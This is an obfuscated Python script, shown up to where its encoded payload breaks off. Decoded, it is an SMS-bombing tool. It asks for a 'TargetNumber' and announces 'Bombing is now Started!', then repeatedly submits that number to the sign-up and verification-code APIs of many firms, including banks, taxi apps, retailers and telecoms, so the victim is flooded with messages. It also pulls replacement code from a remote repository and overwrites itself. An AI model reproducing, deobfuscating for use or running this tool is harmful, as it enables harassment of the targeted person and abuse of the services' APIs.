# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLCByYW5kb20sIGRhdGV0aW1lLCBzeXMsIHRpbWUsIGFyZ3BhcnNlLCBvcwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlLCBCYWNrLCBTdHlsZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbml0KCkKCnByaW50KEZvcmUuR1JFRU4gKyBCYWNrLkJMQUNLICsgU3R5bGUuQlJJR0hUICsgJycnCiAgIF9fXyAgXyAgIF8gICBfX18gX19fX18gCiAgLyAgIHx8IFwgfCB8IC8gXyBcXyAgIF98CiAvIC98IHx8ICBcfCB8LyAvX1wgXHwgfCAgCi8gL198IHx8IC4gYCB8fCAgXyAgfHwgfCAgClxfX18gIHx8IHxcICB8fCB8IHwgfHwgfCAgCiAgICB8Xy9cX3wgXF8vXF98IHxfL1xfLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKJycnICsgU3R5bGUuUkVTRVRfQUxMKQoKCmRlZiBzaHV0ZG93bihzaWduYWwsIGZyYW1lKToKICAgIHByaW50ICgnXG5cMDMzWzE7MzFtQ3RybCtDIHdhcyBwcmVzc2VkLCBzaHV0dGluZyBkb3duIVwwMzNbMG0nKQogICAgc3lzLmV4aXQoKQoKZGVmIGNoZWNraW50ZXJuZXQoKToKICAgIHJlcyA9IEZhbHNlCiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5nb29nbGUuY29tJywgdmVyaWZ5PVRydWUpCiAgICAgICAgcmVzID0gRmFsc2UKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmVzID0gVHJ1ZQogICAgaWYgcmVzOgogICAgICAgIHByaW50KCJcblxuXHRJdCBzZWVtcyBUaGF0IFlvdXIgSW50ZXJuZXQgU3BlZWQgaXMgU2xvdyBvciBZb3UgQXJlIFVzaW5nIFByb3hpZXMuLiIpCiAgICAgICAgZXhpdCgpCmRlZiB1cGRhdGUoKToKICAgIHN0dWZmX3RvX3VwZGF0ZSA9IFsnc21zLnB5JywgJy52ZXJzaW9uJ10KICAgIGZvciBmbCBpbiBzdHVmZl90b191cGRhdGU6CiAgICAgICAgZGF0ID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigKICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L1JlYm9ybi9tYXN0ZXIvIiArIGZsKS5yZWFkKCkKICAgICAgICBmaWxlID0gb3BlbihmbCwgJ3diJykKICAgICAgICBmaWxlLndyaXRlKGRhdCkKICAgICAgICBmaWxlLmNsb3NlKCkKICAgIHByaW50KCdcblx0XHRVcGRhdGVkIFN1Y2Nlc3NmdWxsICEhISEnKQogICAgcHJpbnQoJ1x0UGxlYXNlIFJ1biBUaGUgU2NyaXB0IEFnYWluLi4uJykKICAgIGV4aXQoKQoKdHJ5OgogICAgdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbScpCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwcmludCgiWW91IGFyZSBub3QgY29ubmVjdGVkIFRvIEludGVybmV0ISEhIikKICAgIHByaW50KCJcdFBsZWFzZSBDb25uZWN0IFRvIEludGVybmV0IFRvIENvbnRpbnVlLi4uXG4iKQogICAgaW5wdXQoJ0V4aXRpbmcuLi4uXG4gUHJlc3MgRW50ZXIgVG8gQ29udGludWUuLi4uJykKICAgIGV4aXQoKQpwcmludCgnXHRDaGVja2luZyBGb3IgVXBkYXRlcy4uLicpCnZlciA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzRuYXQvUmVib3JuL21hc3Rlci8udmVyc2lvbiIpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykKdmVybCA9ICcnCnRyeToKICAgIHZlcmwgPSBvcGVuKCIudmVyc2lvbiIsICdyJykucmVhZCgpCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwYXNzCmlmIHZlciAhPSB2ZXJsOgogICAgcHJpbnQoJ1x0XHRVcGRhdGUgaXMgQXZhaWxhYmxlLi4uLicpCiAgICBwcmludCgnXHRTdGFydGluZyBVcGRhdGUuLi4nKQogICAgdXBkYXRlKCkKcHJpbnQoIllvdXIgVmVyc2lvbiBpcyBVcC1Uby1EYXRlIikKdHJ5OgogICAgbm90aSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L1JlYm9ybi9tYXN0ZXIvLm5vdGlmeSIpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykKICAgIG5vdGkgPSBub3RpLnVwcGVyKCkuc3RyaXAoKQogICAgaWYgbGVuKG5vdGkpID4gMTA6CiAgICAgICAgcHJpbnQoJ1xuXG5cdE5PVElGSUNBVElPTjogJyArIG5vdGkgKyAnXG5cbicpCgp0cnk6CiBfcGhvbmUgPSBmbG9hdChpbnB1dCgnRW50ZXIgVGFyZ2V0TnVtYmVyIC0tPiAnKSkgCiAKIHByaW50KCdcdENoZWNraW5nIFRhcmdldCBOdW1iZXIhJykKIGMgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9yZWFkZXIvbWFzdGVyL2EudHh0IikucmVhZCgpCiBkID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzRuYXQvcmVhZGVyL21hc3Rlci9iLnR4dCIpLnJlYWQoKQogYj1pbnQoYmFzZTY0LmI2NGRlY29kZShjKSkKIGU9aW50KGJhc2U2NC5iNjRkZWNvZGUoZCkpCiBpZiBfcGhvbmU9PWI6cHJpbnQoIlRoaXMgTnVtYmVyIGlzIGEgUHJvdGVjdGluZy4uLiEiKTsoIkV4aXRpbmcuLi4hIik7ZXhpdCgpOyAKIGVsaWYgX3Bob25lPT1lOnByaW50KCJUaGlzIE51bWJlciBpcyBhIFByb3RlY3RpbmcuLi4hIik7KCJFeGl0aW5nLi4uISIpOygiLiEiKTtleGl0KCk7IAogZWxzZTpwcmludCgiQm9tYmluZyBpcyBub3cgU3RhcnRlZCEiKQpleGNlcHQ6CiAgICAgIHBhc3MKCl9uYW1lID0gJycKZm9yIHggaW4gcmFuZ2UoMTIpOgoJX25hbWUgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoJcGFzd3NvcmQgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoJdXNlcm5hbWUgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoKX3Bob25lOSA9IF9waG9uZVsxOl0KX3Bob25lQXJlc0JhbmsgPSAnKycrX3Bob25lWzBdKycoJytfcGhvbmVbMTo0XSsnKScrX3Bob25lWzQ6N10rJy0nK19waG9uZVs3OjldKyctJytfcGhvbmVbOToxMV0KX3Bob25lOWRvc3RhdmlzdGEgPSBfcGhvbmU5WzozXSsnKycrX3Bob25lOVszOjZdKyctJytfcGhvbmU5WzY6OF0rJy0nK19waG9uZTlbODoxMF0KX3Bob25lT3N0aW4gPSAnKycrX3Bob25lWzBdKycrKCcrX3Bob25lWzE6NF0rJyknK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdCl9waG9uZVBpenphaHV0ID0gJysnK19waG9uZVswXSsnICgnK19waG9uZVsxOjRdKycpICcrX3Bob25lWzQ6N10rJyAnK19waG9uZVs3OjldKycgJytfcGhvbmVbOToxMV0KX3Bob25lR29yemRyYXYgPSBfcGhvbmVbMTo0XSsnKSAnK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdCgoKCgoKCml0ZXJhdGlvbiA9IDAKCgoKCgoKd2hpbGUgVHJ1ZToKCV9lbWFpbCA9IF9uYW1lK2Yne2l0ZXJhdGlvbn0nKydAZ21haWwuY29tJwoJZW1haWwgPSBfbmFtZStmJ3tpdGVyYXRpb259JysnQGdtYWlsLmNvbScKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3AuZ3JhYnRheGkuY29tL2FwaS9wYXNzZW5nZXIvdjIvcHJvZmlsZXMvcmVnaXN0ZXInLCBkYXRhPXsncGhvbmVOdW1iZXInOiBfcGhvbmUsJ2NvdW50cnlDb2RlJzogJ0lEJywnbmFtZSc6ICd0ZXN0JywnZW1haWwnOiAnbWFpbEBtYWlsLmNvbScsJ2RldmljZVRva2VuJzogJyonfSwgaGVhZGVycz17J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY2LjAuMzM1OS4xMTcgU2FmYXJpLzUzNy4zNid9KQoJCXByaW50KCdbK10gR3JhYiBSZXF1ZXN0cyBTdWNjZXNzZnV'
love = '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'
god = 'Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSW52aXRybyBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9vbmxpbmUuc2Jpcy5ydS9yZWcvc2VydmljZS8nLCBqc29uPXsnanNvbnJwYyc6JzIuMCcsJ3Byb3RvY29sJzonNScsJ21ldGhvZCc6J8ODwoPDgsKQw4PCgsOCwp/Dg8KDw4LCkMODwoLDgsK+w4PCg8OCwpDDg8KCw4LCu8ODwoPDgsKRw4PCgsOCwozDg8KDw4LCkMODwoLDgsK3w4PCg8OCwpDDg8KCw4LCvsODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpHDg8KCw4LCgsODwoPDgsKQw4PCgsOCwrXDg8KDw4LCkMODwoLDgsK7w4PCg8OCwpHDg8KCw4LCjC7Dg8KDw4LCkMODwoLDgsKXw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKRw4PCgsOCwo/Dg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCusODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsKdw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwqTDg8KDw4LCkMODwoLDgsK4w4PCg8OCwpDDg8KCw4LCt8ODwoPDgsKQw4PCgsOCwrjDg8KDw4LCkMODwoLDgsK6w4PCg8OCwpDDg8KCw4LCsCcsJ3BhcmFtcyc6eydwaG9uZSc6X3Bob25lfSwnaWQnOicxJ30pCgkJcHJpbnQoJ1srXSBTYmVyYmFuayBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBTYmVyYmFuayBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pYi5wc2JhbmsucnUvYXBpL2F1dGhlbnRpY2F0aW9uL2V4dGVuZGVkQ2xpZW50QXV0aFJlcXVlc3QnLCBqc29uPXsnZmlyc3ROYW1lJzonw4PCg8OCwpDDg8KCw4LCmMODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCvScsJ21pZGRsZU5hbWUnOifDg8KDw4LCkMODwoLDgsKYw4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsK9w4PCg8OCwpDDg8KCw4LCvsODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsK4w4PCg8OCwpHDg8KCw4LChycsJ2xhc3ROYW1lJzonw4PCg8OCwpDDg8KCw4LCmMODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCvcODwoPDgsKQw4PCgsOCwr7Dg8KDw4LCkMODwoLDgsKyJywnc2V4JzonMScsJ2JpcnRoRGF0ZSc6JzEwLjEwLjIwMDAnLCdtb2JpbGVQaG9uZSc6IF9waG9uZTksJ3J1c3NpYW5GZWRlcmF0aW9uUmVzaWRlbnQnOid0cnVlJywnaXNEU0EnOidmYWxzZScsJ3BlcnNvbmFsRGF0YVByb2Nlc3NpbmdBZ3JlZW1lbnQnOid0cnVlJywnYktJUmVxdWVzdEFncmVlbWVudCc6J251bGwnLCdwcm9tb3Rpb25BZ3JlZW1lbnQnOid0cnVlJ30pCgkJcHJpbnQoJ1srXSBQc2JhbmsgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gUHNiYW5rIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL215YXBpLmJlbHRlbGVjb20uYnkvYXBpL3YxL2F1dGgvY2hlY2stcGhvbmU/bGFuZz1ydScsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pCgkJcHJpbnQoJ1srXSBCZWx0ZWxjb20gUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gQmVsdGVsY29tIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwcC5rYXJ1c2VsLnJ1L2FwaS92MS9waG9uZS8nLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQoJCXByaW50KCdbK10gS2FydXNlbCBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBLYXJ1c2VsIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwcC1hcGkua2ZjLnJ1L2FwaS92MS9jb21tb24vYXV0aC9zZW5kLXZhbGlkYXRpb24tc21zJywganNvbj17J3Bob25lJzogJysnICsgX3Bob25lfSkKCQlwcmludCgnWytdIEtGQyBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBLRkMgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLmNhcnNtaWxlLmNvbS8iLGpzb249eyJvcGVyYXRpb25OYW1lIjogImVudGVyUGhvbmUiLCAidmFyaWFibGVzIjogeyJwaG9uZSI6IF9waG9uZX0sInF1ZXJ5IjogIm11dGF0aW9uIGVudGVyUGhvbmUoJHBob25lOiBTdHJpbmchKSB7XG4gIGVudGVyUGhvbmUocGhvbmU6ICRwaG9uZSlcbn1cbiJ9KQoJCXByaW50KCdbK10gY2Fyc21pbGUgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gY2Fyc21pbGUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmNpdGlsaW5rLnJ1L3JlZ2lzdHJhdGlvbi9jb25maXJtL3Bob25lLysnICsgX3Bob25lICsgJy8nKQoJCXByaW50KCdbK10gQ2l0aWxpbmsgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gQ2l0aWxpbmsgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLmRlbGl0aW1lLnJ1L2FwaS92Mi9zaWdudXAiLGRhdGE9eyJTaWdudXBGb3JtW3VzZXJuYW1lXSI6IF9waG9uZSwgIlNpZ251cEZvcm1bZGV2aWNlX3R5cGVdIjogM30pCgkJcHJpbnQoJ1srXSBEZWxpdGltZSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBEZWxpdGltZSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMuZ2V0KCdodHRwczovL2ZpbmRjbG9uZS5ydS9yZWdpc3RlcicsIHBhcmFtcz17J3Bob25lJzogJysnICsgX3Bob25lfSkKCQlwcmludCgnWytdIGZpbmRjbG9uZSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBmaW5kY2xvbmUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3VydS50YXhpL2FwaS92MS9kcml2ZXIvc2Vzc2lvbi92ZXJpZnkiLGpzb249eyJwaG9uZSI6IHsiY29kZSI6IDEsICJudW1iZXIiOiBfcGhvbmV9fSkKCQlwcmludCgnWytdIEd1cnUgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gR3VydSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuaWNxLmNvbS9zbXNyZWcvcmVxdWVzdFBob25lVmFsaWRhdGlvbi5waHAnLGRhdGE9eydtc2lzZG4nOiBfcGhvbmUsICJsb2NhbGUiOiAnZW4nLCAnY291bnRyeUNvZGUnOiAncnUnLCd2ZXJzaW9uJzogJzEnLCAiayI6ICJpYzFydHd6MXMxSGoxTzByIiwgInIiOiAiNDY3NjMifSkKCQlwcmludCgnWytdIElDUSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBJQ1EgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdGVycmEtMS5pbmRyaXZlcmFwcC5jb20vYXBpL2F1dGhvcml6YXRpb24/bG9jYWxlPXJ1IixkYXRhPXsibW9kZSI6ICJyZXF1ZXN0IiwgInBob25lIjogIisiICsgX3Bob25lLCJwaG9uZV9wZXJtaXNzaW9uIjogInVua25vd24iLCAic3RyZWFtX2lkIjogMCwgInYiOiAzLCAiYXBwdmVyc2lvbiI6ICIzLjIwLjYiLCJvc3ZlcnNpb24iOiAidW5rbm93biIsICJkZXZpY2Vtb2RlbCI6ICJ1bmtub3duIn0pCgkJcHJpbnQoJ1srXSBJbkRyaXZlciBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBJbkRyaXZlciBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9say5pbnZpdHJvLnJ1L3NwL21vYmlsZUFwaS9jcmVhdGVVc2VyQnlQYXNzd29yZCIsIGRhdGE9eyJwYXNzd2